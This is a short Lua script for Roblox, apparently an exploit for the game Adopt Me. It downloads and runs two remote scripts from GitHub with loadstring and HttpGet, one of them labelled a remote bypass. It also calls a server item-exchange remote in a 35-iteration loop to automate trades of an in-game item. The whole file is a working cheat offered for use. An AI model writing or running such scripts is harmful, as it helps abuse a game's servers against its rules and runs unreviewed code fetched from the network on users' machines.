loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(1)
for i = 1, 35 do
    local args = {
        "food",
        "butterfly_2025_snapdragon_flower",
        1
    }
    game:GetService("ReplicatedStorage"):WaitForChild("API"):WaitForChild("SocialStonesAPI/AttemptExchange"):FireServer(unpack(args))
    task.wait(0.2)
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/diwserenityhub/other/refs/heads/main/butterfly_auto_open.lua"))()
